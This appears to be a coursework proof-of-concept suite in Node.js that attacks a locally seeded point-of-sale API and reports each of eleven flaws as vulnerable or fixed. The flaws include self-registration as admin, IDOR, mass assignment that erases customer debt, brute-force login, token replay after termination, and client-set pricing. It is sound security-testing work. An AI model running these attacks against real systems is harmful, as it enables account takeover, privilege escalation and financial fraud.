/**
 * SE4030 Secure Software Development - vulnerability proof-of-concept suite
 *
 *   node evidence/poc/run-all.mjs
 *   POC_BASE=http://127.0.0.1:8000/api node evidence/poc/run-all.mjs
 *
 * Prerequisites
 *   php artisan migrate:fresh --force
 *   php artisan db:seed --class=SecurityDemoSeeder
 *   php artisan cache:clear                     # resets the login rate limiter
 *   php artisan serve --host=127.0.0.1 --port=8000
 *
 * Note on re-running: V-05b deliberately exhausts the login rate limiter, so a
 * second run inside the same minute will find it still spent. Clear the cache
 * between runs (above) or wait 60 seconds; the suite reports SKIPPED rather
 * than a misleading result when it detects this.
 *
 * Each PoC is an actual attack, not a code inspection. Against the original
 * application (tag v0-original-vulnerable) the attacks succeed and the suite
 * prints VULNERABLE. After the corresponding remediation commit the same
 * attack is rejected and the suite prints FIXED. The exit code is the number
 * of vulnerabilities still exploitable, so the suite doubles as a CI gate.
 */

import {
  BASE, get, post, put, del, http, login,
  record, skip, summary, banner, bold, grey,
} from './lib.mjs';

const ADMIN = { username: 'admin', password: 'Admin@Pass123' };
const COLOMBO = { username: 'cashier.colombo', password: 'Cashier@Pass123' };
const KANDY = { username: 'cashier.kandy', password: 'Cashier@Pass123' };
const TERMINATED = { username: 'terminated.staff', password: 'Cashier@Pass123' };

const PHASE = process.env.POC_PHASE || 'current';

/** Truncate a body for display. */
const brief = (r, n = 180) =>
  (typeof r.text === 'string' ? r.text : JSON.stringify(r.data ?? '')).replace(/\s+/g, ' ').slice(0, n);

// ===========================================================================
// V-01  Public registration endpoint mints administrator tokens
// ===========================================================================
async function v01() {
  const suffix = Date.now().toString().slice(-8);
  const r = await post('/register', {
    full_name: 'Mallory Attacker',
    nic_no: `99${suffix}V`,
    phone_no_01: '0700000000',
    phone_no_02: '0700000001',
    username: `attacker_${suffix}`,
    password: 'password',           // 6-char minimum is all the policy demands
    role: 'admin',                  // <-- caller chooses their own privilege
    department_id: 1,
  });

  const token = r.data?.data?.token ?? null;
  const role = r.data?.data?.user?.role ?? null;

  // Prove the token really carries admin authority rather than trusting the
  // response body - list every user in the system with it.
  let adminProof = 'no token issued';
  if (token) {
    const users = await get('/all-users', { token });
    adminProof = users.status === 200
      ? `token works: GET /all-users -> 200, ${users.data?.data?.length ?? '?'} user records returned`
      : `token issued but /all-users -> ${users.status}`;
  }

  record(
    'V-01',
    'Unauthenticated registration grants an administrator token',
    'OWASP A01:2021 Broken Access Control | CWE-862 Missing Authorization | CVSS 9.8',
    token !== null && role === 'admin',
    [
      `POST ${BASE}/register  (no Authorization header)`,
      `  body contained "role":"admin"`,
      `  -> HTTP ${r.status}, role granted = ${role ?? 'none'}`,
      `  ${adminProof}`,
    ].join('\n'),
  );
}

// ===========================================================================
// V-02  Privileged operations reachable by any authenticated employee
// ===========================================================================
async function v02(empToken) {
  if (!empToken) return skip('V-02', 'Privileged routes lack role checks', 'employee login failed');

  // Snapshot the catalogue price so the reprice probe below can put it back.
  // Without this, probing "can an employee reprice stock?" corrupts the
  // fixture that the V-10 price-tampering PoC later checks against.
  const batchesBefore = await get('/grns/product/PRD0001/batches', { token: empToken });
  const originalPrice = batchesBefore.data?.data?.batches?.[0]?.selling_price ?? null;

  // Each of these should require an administrator.
  const probes = [
    ['GET', '/reports/daily-profit', undefined, 'read company-wide profit and margin'],
    ['GET', '/reports/customers', undefined, 'export the full customer list'],
    ['POST', '/customers/1/adjust-credit', { new_balance: 0, reason: 'poc' }, "zero a customer's outstanding debt"],
    ['POST', '/grn-items/update-selling-price', { grn_code: 'GRN0001', product_code: 'PRD0001', selling_price: 1 }, 'reprice stock'],
  ];

  const reached = [];
  for (const [method, path, body, what] of probes) {
    const r = await http(method, path, { token: empToken, body });
    // 401/403 = properly refused. 404/422/500 = reached the controller but the
    // payload or fixture did not line up; still proves no authorization gate.
    const refused = r.status === 401 || r.status === 403;
    if (!refused) reached.push(`${method} ${path} -> ${r.status}  (${what})`);
  }

  // Restore the catalogue price, whether or not the probe succeeded.
  if (originalPrice !== null) {
    await post('/grn-items/update-selling-price', {
      grn_code: 'GRN0001', product_code: 'PRD0001', selling_price: Number(originalPrice),
    }, { token: empToken });
  }

  record(
    'V-02',
    'Administrator-only operations are reachable by any employee',
    'OWASP A01:2021 Broken Access Control | API5:2023 BFLA | CWE-285 Improper Authorization',
    reached.length > 0,
    reached.length
      ? ['authenticated as a CASHIER (role=employee); not one of these was refused:', ...reached.map((s) => '  ' + s)].join('\n')
      : 'every privileged probe was refused with 401/403',
  );
}

// ===========================================================================
// V-03  IDOR / BOLA - no branch (tenant) scoping
// ===========================================================================
async function v03(colomboToken) {
  if (!colomboToken) return skip('V-03', 'Cross-branch object access', 'employee login failed');

  // CUS0002 / INV0002 belong to the Kandy branch. The caller works in Colombo.
  const cust = await get('/customers/2', { token: colomboToken });
  const inv = await get('/invoices/2', { token: colomboToken });

  const gotCustomer = cust.status === 200 && !!cust.data?.data;
  const gotInvoice = inv.status === 200 && !!inv.data?.data;
  const name = cust.data?.data?.customer_name ?? null;
  const bal = cust.data?.data?.credit_balance ?? null;

  record(
    'V-03',
    'Employee reads another branch\'s customers and invoices (IDOR / BOLA)',
    'OWASP A01:2021 | API1:2023 BOLA | CWE-639 Authorization Bypass Through User-Controlled Key',
    gotCustomer || gotInvoice,
    [
      'authenticated as the COLOMBO cashier (department_id=1)',
      `  GET /customers/2  -> ${cust.status}` + (gotCustomer ? `  leaked: "${name}", credit balance ${bal}` : ''),
      `  GET /invoices/2   -> ${inv.status}` + (gotInvoice ? `  leaked: Kandy branch invoice ${inv.data?.data?.inv_no ?? ''}` : ''),
      '  both records belong to department_id=2 (Kandy)',
    ].join('\n'),
  );
}

// ===========================================================================
// V-04  Mass assignment on immutable identity and money columns
// ===========================================================================
async function v04(empToken) {
  if (!empToken) return skip('V-04', 'Mass assignment', 'employee login failed');

  const base = (c) => ({
    customer_name: c.customer_name,
    phone_no_01: c.phone_no_01,
    nic_no: c.nic_no,
  });

  // --- (a) credit_balance: erase real debt, with no ledger entry ------------
  // CUS0001 owes 45 000 LKR. credit_balance is $fillable but is not in the
  // update validation rules, so it rides in on $request->all().
  const b1 = await get('/customers/1', { token: empToken });
  const c1 = b1.data?.data ?? {};
  const origBal = Number(c1.credit_balance ?? -1);

  const wipe = await put('/customers/1', { ...base(c1), credit_balance: 0 }, { token: empToken });
  const a1 = await get('/customers/1', { token: empToken });
  const newBal = Number(a1.data?.data?.credit_balance ?? -1);
  const balWiped = origBal > 0 && newBal === 0;

  // Was an audit row written? adjustCreditBalance() always writes one.
  const ledger = await get('/customers/1/credit-transactions', { token: empToken });
  const ledgerRows = Array.isArray(ledger.data?.data) ? ledger.data.data.length : null;

  if (balWiped) {
    await put('/customers/1', { ...base(c1), credit_balance: origBal }, { token: empToken });
  }

  // --- (b) customer_code: rewrite the business key --------------------------
  // Done against CUS0003, which has no invoices. On a customer that DOES have
  // invoices the database foreign key blocks the update - the application
  // itself never objects, so the protection is incidental, not designed.
  const b2 = await get('/customers/3', { token: empToken });
  const c3 = b2.data?.data ?? {};
  const origCode = c3.customer_code;

  const rekey = await put('/customers/3', { ...base(c3), customer_code: 'CUS-HIJACKED' }, { token: empToken });
  const a2 = await get('/customers/3', { token: empToken });
  const newCode = a2.data?.data?.customer_code;
  const codeChanged = !!origCode && newCode !== origCode;

  if (codeChanged) {
    await put('/customers/3', { ...base(c3), customer_code: origCode }, { token: empToken });
  }

  record(
    'V-04',
    'Mass assignment erases customer debt and rewrites the business key',
    'OWASP A08:2021 | API6:2023 | CWE-915 Improperly Controlled Modification of Attributes',
    balWiped || codeChanged,
    [
      `(a) PUT /customers/1  {"credit_balance":0}  -> ${wipe.status}`,
      `      credit_balance: ${origBal} -> ${newBal}  ${balWiped ? '*** 45 000 LKR of debt erased ***' : '(unchanged)'}`,
      `      credit_transactions rows afterwards: ${ledgerRows ?? 'n/a'}${balWiped && ledgerRows === 0 ? '   <- no audit trail of the write-off' : ''}`,
      `(b) PUT /customers/3  {"customer_code":"CUS-HIJACKED"}  -> ${rekey.status}`,
      `      customer_code : ${origCode} -> ${newCode}  ${codeChanged ? '*** business key rewritten ***' : '(unchanged)'}`,
      '      invoices and credit_transactions join on customer_code, so rewriting it',
      '      re-points a customer at another customer\'s financial history',
      '  neither field appears in the controller validation rules; both reach the',
      '  model through $request->all() at CustomerController.php:148',
    ].join('\n'),
  );
}

// ===========================================================================
// V-05a  Username enumeration via distinguishable login failures
// ===========================================================================
async function v05a() {
  const noSuchUser = await post('/login', { username: 'definitely_not_a_user_9931', password: 'x' });
  const realUser = await post('/login', { username: 'admin', password: 'wrong-password' });

  // Once V-05b is fixed, the login limiter can still be exhausted from an
  // earlier run in the same minute. A 429 here says nothing about enumeration
  // and must not be reported either way - comparing a 401 against a 429 would
  // produce a false VULNERABLE.
  if (noSuchUser.status === 429 || realUser.status === 429) {
    return skip(
      'V-05a',
      'Login responses reveal whether a username exists',
      'login rate limit already exhausted (V-05b is fixed). Run:\n'
      + '  php artisan cache:clear   # resets the limiter\n'
      + 'then re-run this suite, or wait 60 seconds.',
    );
  }

  const differs = noSuchUser.status !== realUser.status
    || (noSuchUser.data?.message ?? '') !== (realUser.data?.message ?? '');

  record(
    'V-05a',
    'Login responses reveal whether a username exists',
    'OWASP A07:2021 Identification and Authentication Failures | CWE-204 Observable Response Discrepancy',
    differs,
    [
      `unknown username -> HTTP ${noSuchUser.status}  "${noSuchUser.data?.message ?? ''}"`,
      `known username, wrong password -> HTTP ${realUser.status}  "${realUser.data?.message ?? ''}"`,
      differs
        ? '  the two responses differ, so valid usernames can be harvested before any password guessing'
        : '  responses are identical - nothing leaks',
    ].join('\n'),
  );
}

// ===========================================================================
// V-05b  No brute-force protection on the login endpoint
// ===========================================================================
async function v05b() {
  const ATTEMPTS = 20;
  let throttled = 0;
  let accepted = 0;
  let firstThrottleAt = null;

  for (let i = 1; i <= ATTEMPTS; i++) {
    const r = await post('/login', { username: 'admin', password: `guess-${i}` });
    if (r.status === 429) {
      throttled++;
      if (firstThrottleAt === null) firstThrottleAt = i;
    } else {
      accepted++;
    }
  }

  record(
    'V-05b',
    'Password guessing is not rate limited per account',
    'OWASP A07:2021 | CWE-307 Improper Restriction of Excessive Authentication Attempts',
    firstThrottleAt === null || firstThrottleAt > 10,
    [
      `${ATTEMPTS} consecutive failed logins for user "admin" from one IP`,
      `  processed without throttling: ${accepted}`,
      `  rejected with HTTP 429      : ${throttled}`,
      firstThrottleAt === null
        ? '  never throttled - offline-speed password spraying is possible'
        : `  first 429 on attempt #${firstThrottleAt}`,
    ].join('\n'),
  );
}

// ===========================================================================
// V-06  Deactivating a user does not revoke the tokens they already hold
// ===========================================================================
async function v06(adminToken) {
  if (!adminToken) return skip('V-06', 'Token revocation on deactivation', 'admin login failed');

  const victimToken = await login(TERMINATED.username, TERMINATED.password);
  if (!victimToken) return skip('V-06', 'Token revocation on deactivation', 'could not log in as terminated.staff');

  const beforeMe = await get('/me', { token: victimToken });

  // The administrator terminates the employee.
  const users = await get('/all-users', { token: adminToken });
  const victim = (users.data?.data ?? []).find((u) => u.username === TERMINATED.username);
  if (!victim) return skip('V-06', 'Token revocation on deactivation', 'could not locate the fixture user');

  const deact = await put(`/users/${victim.id}`, {
    full_name: victim.full_name,
    nic_no: victim.nic_no,
    phone_no_01: victim.phone_no_01,
    username: victim.username,
    role: victim.role,
    is_active: false,
  }, { token: adminToken });

  // Can the ex-employee still use the token issued before termination?
  const afterMe = await get('/me', { token: victimToken });
  const stillWorks = afterMe.status === 200;

  // Confirm they can no longer obtain a NEW token, isolating the defect to
  // revocation rather than to the deactivation itself.
  const reLogin = await post('/login', { username: TERMINATED.username, password: TERMINATED.password });

  // Restore the fixture.
  await put(`/users/${victim.id}`, {
    full_name: victim.full_name,
    nic_no: victim.nic_no,
    phone_no_01: victim.phone_no_01,
    username: victim.username,
    role: victim.role,
    is_active: true,
  }, { token: adminToken });

  record(
    'V-06',
    'Tokens survive account deactivation and never expire',
    'OWASP A07:2021 | CWE-613 Insufficient Session Expiration | CWE-672 Operation on Expired Resource',
    stillWorks,
    [
      `employee logs in            -> token issued, GET /me ${beforeMe.status}`,
      `admin sets is_active=false  -> PUT /users/${victim.id} ${deact.status}`,
      `fresh login now refused     -> POST /login ${reLogin.status}`,
      `EXISTING token replayed     -> GET /me ${afterMe.status}` + (stillWorks ? '  *** still authorised after termination ***' : '  correctly rejected'),
      '  config/sanctum.php sets expiration => null, so that token is valid forever',
    ].join('\n'),
  );
}

// ===========================================================================
// V-07  Internal error detail disclosed to the client
// ===========================================================================
async function v07(empToken) {
  if (!empToken) return skip('V-07', 'Error detail disclosure', 'employee login failed');

  // /reports/carts references App\Models\Cart, a class that does not exist.
  const broken = await get('/reports/carts', { token: empToken });
  // Reports interpolate unvalidated date parameters straight into whereBetween.
  const badDates = await get('/reports/products', { token: empToken });

  const leakPattern =
    /SQLSTATE|SQL:|vendor\\\\|vendor\/|\.php|Class .* not found|Illuminate\\\\|stack|Exception|syntax error/i;

  const leaks = [];
  if (leakPattern.test(broken.text)) leaks.push(`GET /reports/carts    -> ${broken.status}  ${brief(broken)}`);
  if (leakPattern.test(badDates.text)) leaks.push(`GET /reports/products -> ${badDates.status}  ${brief(badDates)}`);

  record(
    'V-07',
    'Server returns internal exception detail to the client',
    'OWASP A05:2021 Security Misconfiguration | CWE-209 Generation of Error Message Containing Sensitive Information',
    leaks.length > 0,
    leaks.length
      ? ['responses exposed internal implementation detail:', ...leaks.map((s) => '  ' + s)].join('\n')
      : `no internal detail leaked (carts -> ${broken.status}, products -> ${badDates.status})`,
  );
}

// ===========================================================================
// V-08  CORS allows any origin to script the API
// ===========================================================================
async function v08() {
  const evil = 'https://attacker.example.com';
  const r = await http('GET', '/login', { headers: { Origin: evil } });
  const allow = r.headers.get('access-control-allow-origin');
  const creds = r.headers.get('access-control-allow-credentials');

  record(
    'V-08',
    'CORS policy accepts every origin',
    'OWASP A05:2021 | CWE-942 Permissive Cross-domain Policy',
    allow === '*' || allow === evil,
    [
      `request sent with Origin: ${evil}`,
      `  Access-Control-Allow-Origin      : ${allow ?? '(absent)'}`,
      `  Access-Control-Allow-Credentials : ${creds ?? '(absent)'}`,
      allow === '*'
        ? '  any website on the internet may script this API from a victim browser'
        : '  origin is restricted',
    ].join('\n'),
  );
}

// ===========================================================================
// V-09  No security response headers
// ===========================================================================
async function v09() {
  // A DELIBERATELY FAILED login. The headers under test are set by global
  // middleware and are present on every response, so a successful sign-in is
  // not needed - and must be avoided: once V-06 is fixed, logging in revokes
  // the caller's previous tokens (one active session per user), which would
  // silently invalidate the admin token that later tests in this run depend on.
  const r = await post('/login', { username: 'admin', password: 'not-the-password' });
  const wanted = [
    'x-content-type-options',
    'x-frame-options',
    'referrer-policy',
    'content-security-policy',
    'strict-transport-security',
  ];
  const missing = wanted.filter((h) => !r.headers.get(h));

  record(
    'V-09',
    'Security response headers are absent',
    'OWASP A05:2021 | CWE-693 Protection Mechanism Failure',
    missing.length >= 3,
    [
      'headers on an authenticated API response:',
      ...wanted.map((h) => `  ${(r.headers.get(h) ? '[present] ' : '[MISSING] ') + h}${r.headers.get(h) ? ' = ' + r.headers.get(h) : ''}`),
    ].join('\n'),
  );
}

// ===========================================================================
// V-10  Unit price and discount are dictated by the client
// ===========================================================================
async function v10(empToken) {
  if (!empToken) return skip('V-10', 'Client-controlled pricing', 'employee login failed');

  // Read the real catalogue price rather than hard-coding it, so this PoC
  // cannot silently pass because an earlier probe moved the fixture.
  const batches = await get('/grns/product/PRD0001/batches', { token: empToken });
  const CATALOGUE_PRICE = Number(batches.data?.data?.batches?.[0]?.selling_price ?? 0);

  if (!CATALOGUE_PRICE) {
    return skip('V-10', 'Client-controlled pricing', 'could not read the catalogue price for PRD0001');
  }

  const r = await post('/invoices', {
    inv_date: new Date().toISOString().slice(0, 10),
    customer_type: 'cash',
    payment_status: 'cash',
    pay_amount: 2,
    department_id: 1,
    type: 'tire',
    items: [{
      product_code: 'PRD0001',
      product_name: 'Michelin Primacy 4 205/55R16',
      qty: 1,
      selling_price: 1,     // <-- attacker states the price
      discount: 0,
      type: 'product',
    }],
  }, { token: empToken });

  const invNo = r.data?.data?.inv_no ?? r.data?.data?.invoice?.inv_no ?? null;
  let storedNet = null;
  if (invNo) {
    const fetched = await get(`/invoices/invoice-no/${invNo}`, { token: empToken });
    storedNet = fetched.data?.data?.net_total ?? null;
  }

  const sold = r.status >= 200 && r.status < 300 && Number(storedNet) < CATALOGUE_PRICE;

  // A discount with no approval behind it must also be refused.
  const unapproved = await post('/invoices', {
    inv_date: new Date().toISOString().slice(0, 10),
    customer_type: 'cash',
    payment_status: 'cash',
    pay_amount: 0,
    department_id: 1,
    type: 'tire',
    items: [{
      product_code: 'PRD0001',
      product_name: 'Michelin Primacy 4 205/55R16',
      qty: 1,
      selling_price: CATALOGUE_PRICE,      // correct price...
      discount: CATALOGUE_PRICE - 1,       // ...but an unapproved discount
      type: 'product',
    }],
  }, { token: empToken });
  const discountTaken = unapproved.status >= 200 && unapproved.status < 300;

  record(
    'V-10',
    'Cashier sets the selling price, bypassing the discount-approval workflow',
    'OWASP A04:2021 Insecure Design | CWE-602 Client-Side Enforcement of Server-Side Security',
    sold || discountTaken,
    [
      `(a) price tampering    POST /invoices -> ${r.status}` + (invNo ? `  created ${invNo}` : ''),
      `      catalogue price (grn_items.selling_price) : ${CATALOGUE_PRICE} LKR`,
      `      price submitted by the cashier            : 1 LKR`,
      `      net_total persisted by the server         : ${storedNet ?? 'n/a'}`,
      sold
        ? '      *** the server stored the attacker-supplied price verbatim ***'
        : '      rejected - the server resolved the price from the catalogue',
      `(b) unapproved discount  POST /invoices -> ${unapproved.status}`,
      `      correct price, but discount ${CATALOGUE_PRICE - 1} with no approved DiscountRequest`,
      discountTaken
        ? '      *** accepted, so the whole approval workflow is decorative ***'
        : '      rejected - a discount now requires an approved, unconsumed request',
      ...(discountTaken || sold ? [] : ['  ' + brief(unapproved, 220)]),
    ].join('\n'),
  );
}

// ===========================================================================
// V-06b  Password policy strength (probed through the admin create-user path)
// ===========================================================================
async function v05c(adminToken) {
  if (!adminToken) return skip('V-05c', 'Password policy', 'admin login failed');

  const suffix = Date.now().toString().slice(-7);
  const r = await post('/register', {
    full_name: 'Weak Password Probe',
    nic_no: `88${suffix}V`,
    phone_no_01: '0700000000',
    phone_no_02: '0700000002',
    username: `weakpw_${suffix}`,
    password: '123456',            // the six weakest characters in common use
    role: 'employee',
    department_id: 1,
  }, { token: adminToken });

  const accepted = r.status >= 200 && r.status < 300;

  record(
    'V-05c',
    'Password policy accepts "123456"',
    'OWASP A07:2021 | CWE-521 Weak Password Requirements',
    accepted,
    [
      `POST /register with password "123456" -> ${r.status}`,
      accepted
        ? '  accepted. Rule is min:6 with no complexity and no breach check,\n  so the most-guessed password in the world is a valid staff credential.'
        : `  rejected: ${brief(r, 160)}`,
    ].join('\n'),
  );
}

// ===========================================================================
// V-11  No security audit trail
// ===========================================================================
async function v11(adminToken, empToken) {
  if (!adminToken) return skip('V-11', 'Security audit trail', 'admin login failed');

  // Perform an auditable, money-moving action, then ask whether the system
  // recorded who did it.
  const adjust = await post('/customers/1/adjust-credit', {
    adjustment_type: 'decrease',
    amount: 100,
    reason: 'PoC probe - verifying the audit trail',
    adjustment_date: new Date().toISOString().slice(0, 10),
  }, { token: adminToken });

  // And a failed login, which the original code did not record at all.
  await post('/login', { username: 'admin', password: 'deliberately-wrong' });

  const trail = await get('/audit-logs?per_page=10', { token: adminToken });
  const rows = trail.data?.data?.data ?? [];
  const hasAdjust = rows.some((r) => r.action === 'customer.credit.adjusted');
  const hasFailedLogin = rows.some((r) => r.action === 'auth.login.failed');

  // The trail itself must not be readable by a cashier.
  const empRead = empToken ? await get('/audit-logs', { token: empToken }) : null;
  const empBlocked = empRead ? (empRead.status === 401 || empRead.status === 403) : null;

  const noTrail = trail.status === 404 || trail.status === 500 || !hasAdjust;

  record(
    'V-11',
    'Security-relevant actions are not recorded anywhere',
    'OWASP A09:2021 Security Logging and Monitoring Failures | CWE-778 Insufficient Logging',
    noTrail,
    [
      `credit adjustment performed -> ${adjust.status}`,
      `GET /audit-logs -> ${trail.status}` + (trail.status === 200 ? `  ${rows.length} entries` : ''),
      `  credit adjustment recorded : ${hasAdjust ? 'yes' : 'NO'}`,
      `  failed login recorded      : ${hasFailedLogin ? 'yes' : 'no (wired in the V-05 commit)'}`,
      `  cashier blocked from trail : ${empBlocked === null ? 'n/a' : (empBlocked ? 'yes' : 'NO - employees can read it')}`,
      noTrail
        ? '  no audit trail exists: after an incident there is nothing to reconstruct'
        : '  actions are attributable to an operator, an IP and a timestamp',
    ].join('\n'),
  );
}

// ===========================================================================

async function main() {
  banner(PHASE);

  const adminToken = await login(ADMIN.username, ADMIN.password);
  const colomboToken = await login(COLOMBO.username, COLOMBO.password);

  if (!adminToken && !colomboToken) {
    console.error('Could not authenticate against ' + BASE);
    console.error('Is the API running, and has SecurityDemoSeeder been run?');
    process.exit(99);
  }
  console.log(grey(`  admin token   : ${adminToken ? 'acquired' : 'FAILED'}`));
  console.log(grey(`  cashier token : ${colomboToken ? 'acquired' : 'FAILED'}`));
  console.log();

  await v01();
  await v02(colomboToken);
  await v03(colomboToken);
  await v04(colomboToken);
  await v05a();
  await v05c(adminToken);
  await v06(adminToken);
  await v07(colomboToken);
  await v08();
  await v09();
  await v10(colomboToken);
  await v11(adminToken, colomboToken);

  // Deliberately LAST. Once V-05b is fixed this test intentionally exhausts
  // the login rate limiter, which would then block the logins that V-06 and
  // the token acquisition above depend on. Running it at the end means the
  // limiter is only spent when there is nothing left that needs to sign in.
  await v05b();

  const stillExploitable = summary();
  process.exit(stillExploitable);
}

main().catch((e) => {
  console.error(e);
  process.exit(98);
});
